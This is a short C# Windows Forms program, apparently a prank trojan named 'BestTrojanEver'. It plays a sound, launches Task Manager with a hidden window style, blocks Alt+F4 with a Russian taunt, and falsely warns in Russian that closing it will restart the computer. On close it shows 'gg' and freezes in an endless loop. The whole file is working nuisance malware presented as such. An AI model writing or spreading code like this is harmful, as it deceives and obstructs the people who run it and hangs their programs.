using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Diagnostics;
using System.Threading;

namespace BestTrojanEver
{
    public partial class OtrizkaProduction : Form
    {
        public Thread processSearch;
        

        protected override void OnKeyDown(KeyEventArgs e)
        {
            base.OnKeyDown(e);
            if (e.KeyCode == Keys.F4 && e.Alt)
            {
                MessageBox.Show("не пытайся закрыть дору <3");
                e.Handled = true;
            }
        }
        public OtrizkaProduction()
        {
            InitializeComponent();
            processSearch = new Thread(() =>
            {
                Process flash = new Process();
                flash.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                flash.StartInfo.FileName = @"C:\Windows\System32\Taskmgr.exe";
                flash.Start();
                flash.Close();
            });
        }
        private void OtrizkaProduction_Load(object sender, EventArgs e)
        {
            System.Media.SoundPlayer mainSound = new System.Media.SoundPlayer(@"music.wav");
            mainSound.Play();
            processSearch.Start();
            MessageBox.Show("если закрыть дору,компик перезапуститься <3");
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            MessageBox.Show("gg");
            while (true) { }
                
        }
    }
}
